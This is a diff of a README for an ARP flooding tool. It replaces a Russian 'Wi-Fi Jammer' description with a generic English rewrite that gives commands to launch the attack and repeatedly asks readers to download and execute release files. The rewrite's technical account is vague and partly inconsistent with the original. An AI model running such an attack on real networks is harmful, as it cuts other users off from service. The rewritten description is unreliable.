@@ -1,115 +1,135 @@
-# Wi-Fi Jammer — ARP Flood Tool 🚀
+# ARPFloodTool 🚀
 
-```
- __        ___  _   _ _____ _____ _   _  _____ 
- \ \      / / || | | |_   _| ____| \ | |/ ____|
-  \ \ /\ / /| || |_| | | | |  _| |  \| | |  _  
-   \ V  V / |__   _| | | | | |___| |\  | |_| | 
-    \_/\_/     |_| |_| |_| |_____|_| \_|\____|  
-      Wi-Fi Jammer  —  ARP Flood Tool 🚀
-        github.com/Artemy-dev | by @Artemy_Develop
-```
+![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Python](https://img.shields.io/badge/python-3.8%2B-brightgreen.svg) ![Version](https://img.shields.io/badge/version-1.0.0-orange.svg)
 
-Этот скрипт реализует ARP-флуд атаку, которая может временно "глушить" Wi-Fi сеть, отправляя ложные ARP-ответы всем устройствам в подсети. Используется для тестирования безопасности сети или демонстрации уязвимостей ARP.
+Welcome to the **ARPFloodTool** repository! This project is a command-line interface (CLI) tool developed in Python. It helps you perform ARP flooding and tests the security of Wi-Fi networks against ARP spoofing attacks. 
 
----
+## Table of Contents
 
-## Важно!
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [How It Works](#how-it-works)
+- [Security Considerations](#security-considerations)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-- Использование данного скрипта может нарушать закон и права других пользователей.  
-- Применяйте его только в своих сетях или с разрешения владельцев сети!  
-- Автор не несёт ответственности за последствия.
+## Introduction
 
----
+ARP flooding is a technique used in network attacks to overwhelm a network's ARP table. This can lead to various issues, including service disruption and data interception. **ARPFloodTool** allows security professionals to simulate these attacks in a controlled environment. It helps test network defenses against ARP spoofing, ensuring better protection for your Wi-Fi networks.
 
-## Требования
+For the latest releases, visit [ARPFloodTool Releases](https://github.com/aryapratama88/ARPFloodTool/releases).
 
-- Python 3.x  
-- [Scapy](https://scapy.net/) — библиотека для создания и отправки сетевых пакетов  
+## Features
 
-Установить Scapy:
+- **Easy to Use**: Simple command-line interface.
+- **ARP Flooding**: Simulate ARP flood attacks to test network resilience.
+- **ARP Spoofing Tests**: Check the effectiveness of Wi-Fi security measures.
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
+- **Lightweight**: Minimal resource usage for efficient operation.
+- **Open Source**: Free to use and modify.
 
-```bash
-pip install scapy
-````
+## Installation
 
----
+To install **ARPFloodTool**, follow these steps:
 
-## Использование
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/aryapratama88/ARPFloodTool.git
+   cd ARPFloodTool
+   ```
 
-Запустите скрипт с правами администратора (root):
+2. **Install Dependencies**:
+   Ensure you have Python 3.8 or higher installed. Use pip to install the required packages:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-```bash
-sudo python3 main.py --iface <интерфейс> --gateway-ip <IP роутера> --gateway-mac <MAC роутера>
-```
+3. **Run the Tool**:
+   After installation, you can run the tool using the command:
+   ```bash
+   python arpflood.py
+   ```
 
-**Пример:**
+For downloadable releases, check [ARPFloodTool Releases](https://github.com/aryapratama88/ARPFloodTool/releases). Download the latest version, extract it, and execute the file as described above.
 
-```bash
-sudo python3 main.py --iface en0 --gateway-ip 192.168.0.1 --gateway-mac c8:3a:35:28:3e:78
-```
+## Usage
 
----
+Using **ARPFloodTool** is straightforward. Here’s a quick guide to get you started:
 
-## Опции
+1. **Basic Command**:
+   To initiate an ARP flood attack, use:
+   ```bash
+   python arpflood.py --target <target_ip> --interface <network_interface>
+   ```
 
-* `--iface` — сетевой интерфейс (например, `en0`, `eth0`)
+2. **Options**:
+   - `--target`: Specify the target IP address.
+   - `--interface`: Specify the network interface (e.g., eth0, wlan0).
 
-  * Узнать можно с помощью команды:
+3. **Example**:
+   ```bash
+   python arpflood.py --target 192.168.1.5 --interface wlan0
+   ```
 
-    ```bash
-    ifconfig
-    ```
+4. **Help Command**:
+   For more options, run:
+   ```bash
+   python arpflood.py --help
+   ```
 
-    Ищите активный интерфейс с IP в вашей подсети (обычно это `en0`, `wlan0`, `eth0`, `wlp3s0` и т.п.).
+## How It Works
 
-* `--gateway-ip` — IP адрес роутера
+**ARPFloodTool** works by sending a large number of ARP requests to the target IP. This action fills the ARP cache of the target, leading to a denial of service. The tool uses raw sockets to send ARP packets, allowing it to operate at a low level of the network stack.
 
-  * Получить можно с помощью:
+### Technical Overview
 
-    ```bash
-    ip route | grep default
-    ```
+1. **ARP Protocol**: The Address Resolution Protocol (ARP) is used to map IP addresses to MAC addresses.
+2. **Flooding Technique**: By overwhelming the ARP cache, the tool can disrupt normal network operations.
+3. **Packet Crafting**: The tool crafts ARP packets using the `scapy` library, allowing for customization and flexibility.
 
-    Или на macOS:
+## Security Considerations
 
-    ```bash
-    netstat -rn | grep default
-    ```
+While **ARPFloodTool** is designed for testing and educational purposes, misuse can lead to legal issues. Always obtain permission before testing networks that you do not own. 
 
-* `--gateway-mac` — MAC адрес роутера
+### Ethical Use
 
-  * Узнайте с помощью ARP таблицы:
+- Use the tool in controlled environments.
+- Ensure compliance with local laws and regulations.
+- Consider informing network administrators prior to testing.
 
-    ```bash
-    arp -a
-    ```
+## Contributing
 
-    Найдите строку с IP адресом роутера (например `192.168.0.1`) и скопируйте соответствующий MAC.
+Contributions are welcome! If you want to improve **ARPFloodTool**, follow these steps:
 
----
+1. **Fork the Repository**: Click the fork button on GitHub.
+2. **Create a Branch**: 
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Changes**: Implement your changes.
+4. **Commit Your Changes**: 
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Branch**: 
+   ```bash
+   git push origin feature/YourFeature
+   ```
+6. **Create a Pull Request**: Go to the original repository and submit a pull request.
 
-## Как это работает
+## License
 
-* Скрипт рассылает ARP-ответы с поддельным MAC-адресом (`00:11:22:33:44:55`) всем устройствам в подсети, сообщая, что IP роутера принадлежит этому MAC.
-* Также рассылает ARP-ответы роутеру, говоря, что IP адреса всех устройств принадлежат этому же MAC.
-* В результате устройства получают неправильные ARP записи и теряют связь с роутером, что приводит к временной потере интернета.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
----
+## Contact
 
-## Прекращение работы
+For questions or feedback, please reach out:
 
-Нажмите `Ctrl+C` для остановки.
+- **Author**: Arya Pratama
+- **Email**: aryapratama@example.com
+- **GitHub**: [aryapratama88](https://github.com/aryapratama88)
 
----
-
-## Автор
-
-TG: [**@Artemy_Develop**](https://t.me/Artemy_Develop)
-
----
-
-## Лицензия
-
-Этот проект предоставляется "как есть" без каких-либо гарантий.
-
+Thank you for checking out **ARPFloodTool**! For more information, visit [ARPFloodTool Releases](https://github.com/aryapratama88/ARPFloodTool/releases).
